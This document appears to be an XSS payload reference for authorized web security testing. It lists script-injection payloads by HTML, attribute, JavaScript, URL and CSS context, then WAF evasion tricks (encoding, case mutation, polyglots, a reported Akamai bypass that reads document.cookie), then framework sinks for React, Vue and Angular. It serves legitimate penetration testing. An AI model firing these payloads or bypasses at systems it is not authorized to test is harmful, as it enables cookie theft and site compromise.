# XSS Payload Catalog

Use these payloads after the context is classified. Prefer the smallest payload that matches the reflection or sink.

## HTML Body

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

## Quoted Attribute

```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
" ><svg onload=alert(1)>
```

## Unquoted Attribute

```html
onfocus=alert(1) autofocus
x onmouseover=alert(1)
><svg onload=alert(1)>
```

## JavaScript String

```javascript
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
```

## Template Literals

```javascript
${alert(1)}
`);alert(1);//
${(()=>alert(1))()}
```

## URL / `href` / `src`

```text
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//example.com/%0ajavascript:alert(1)
```

Use these only when the application actually navigates, renders, or dereferences the value in a browser-controlled context.

## CSS / Style Context

```css
</style><script>alert(1)</script>
background-image:url("javascript:alert(1)")
```

Modern browsers block many legacy CSS execution paths. Treat CSS reflections as higher-friction and verify in-browser before calling them confirmed.

## DOM Verification Helpers

Use these to prove DOM execution after identifying a reachable source-to-sink chain:

```javascript
#location.hash
#"><img src=x onerror=alert(1)>
#${alert(1)}
```

Adjust the fragment, query string, storage value, or `postMessage` body to the source you mapped.

## WAF Bypass Catalog

Escalate gradually. Keep the payload semantically tied to the classified context.

### Encoding

```html
%3Csvg%20onload%3Dalert(1)%3E
\u003cscript\u003ealert(1)\u003c/script\u003e
&lt;img src=x onerror=alert(1)&gt;
```

### Case Mutation

```html
<ScRiPt>alert(1)</ScRiPt>
<SvG onLoAd=alert(1)>
```

### Separator and Whitespace Tricks

```html
<img/src=x/onerror=alert(1)>
<svg%0aonload=alert(1)>
<img src=x onerror%09=%09alert(1)>
```

### Event Swaps

```html
<details open ontoggle=alert(1)>
<video autoplay oncanplay=alert(1)><source>
<body onpageshow=alert(1)>
```

### Quote Minimization

```html
"><svg/onload=alert(1)>
'><img src=x onerror=alert(1)>
```

### Advanced Polyglots

Use only after you already know the context and need a harder bypass. See
`agents/xss_bypasses/polyglot.py` (`POLYGLOT_PAYLOADS`) for the runnable bank
these are drawn from — each entry there has a comment explaining exactly which
parsing/filter assumption it breaks.

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */alert(1))//
```

### Computed Identifier Construction (reported Akamai candidate)

For a **single-quoted JavaScript-string context** where a quote breakout is already established, this avoids literal `prompt` and `cookie` identifiers by constructing them with `String.fromCharCode`. Source: [@0xmicho1, 2026-07-24](https://x.com/0xmicho1/status/2080655008270373255); reported as an Akamai WAF bypass. Treat it as a context-specific candidate, not a universal bypass, and verify the server/WAF transform plus browser parsing.

```text
micho',%20x:self[String.fromCharCode(112,114,111,109,112,116)](document[String.fromCharCode(99,111,111,107,105,101)]),%20y:'
```

Use only on an owned/authorized target and prefer a benign proof such as `prompt` over data exfiltration. Record whether the WAF blocks the raw names, the character-code construction, the quote breakout, or the eventual browser execution.

### Unorthodox / Kitchen-Sink Techniques

These techniques target a specific parsing or filtering assumption rather than
adding indiscriminate payload volume. Use them only after context-specific
families are exhausted.

- **Double URL-encoding** (`%250A` -> `%0A` -> newline) to survive a WAF or
  proxy that decodes once: `javascript://%250Aalert?.(1)//`
- **Attribute casting via an unknown tag** — `contentEditable`/`autoFocus`
  can turn an otherwise unknown tag into a focusable target when a filter only
  strips known-dangerous tag names:
  `<k/contentEditable/autoFocus/OnFocus=alert(1)>`
- **Raw-text closer chains** — close the applicable raw-text parsing context
  (`title`/`style`/`script`/`textarea`/`iframe`/`noscript`) only after evidence
  identifies it:
  `</title></style></script></textarea></iframe></noscript><svg onload=alert(1)>`
- **Quote/backtick/entity comment-closer chains** — cover quote variants only
  when the injection point's quoting behavior is uncertain:

  ```text
  //'/*\'/*"/*\"/*`/*\`/*&apos;)/*<svg onload=alert(1)>
  ```
- **`<base>` hijack + trailing comment swallow** — affects relative resource
  URLs and following markup; use only where `<base>` is actually accepted and
  the authorized test plan permits the browser-side impact.

These are noisy and need stronger browser confirmation than a context-matched
probe. Record the parser/WAF transform and stop once the relevant boundary is
understood.

## Framework-Specific Sinks And Bypasses

### React

Common sinks:
- `dangerouslySetInnerHTML`
- URL-bearing props such as `href` and `src`
- Third-party markdown or HTML renderers

Notes:
- Standard JSX interpolation escapes by default.
- Focus on places where untrusted HTML is intentionally injected.
- Check wrappers around sanitizers and any hand-rolled allowlists.

Useful probes:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

React-specific review points:
- `dangerouslySetInnerHTML={{ __html: userInput }}`
- `createElement` wrappers that pass attacker-controlled props
- hydration mismatches or server-rendered unsafe HTML

### Vue

Common sinks:
- `v-html`
- dynamic URL bindings such as `:href` and `:src`
- render functions compiling untrusted template content

Notes:
- Mustache interpolation escapes by default.
- `v-html` is the main high-signal sink.
- Watch for custom components that forward raw HTML to `innerHTML`.

Useful probes:

```html
<img src=x onerror=alert(1)>
javascript:alert(1)
```

Vue-specific review points:
- `v-html="userContent"`
- runtime template compilation from attacker-controlled strings
- router links or custom components that fail to constrain schemes

### Angular

Common sinks:
- `[innerHTML]`
- sanitizer bypass helpers such as `bypassSecurityTrustHtml`, `bypassSecurityTrustUrl`, and `bypassSecurityTrustScript`
- template injection into dynamically compiled components

Notes:
- Angular sanitizes many HTML and URL contexts by default.
- High-value findings usually involve explicit trust bypasses or dangerous custom wrappers.
- Treat interpolation alone as low-signal unless a custom rendering path reinterprets it.

Useful probes:

```html
<img src=x onerror=alert(1)>
javascript:alert(1)
```

Angular-specific review points:
- `this.sanitizer.bypassSecurityTrustHtml(userInput)`
- `[href]="userControlledValue"`
- libraries that disable or replace Angular sanitization
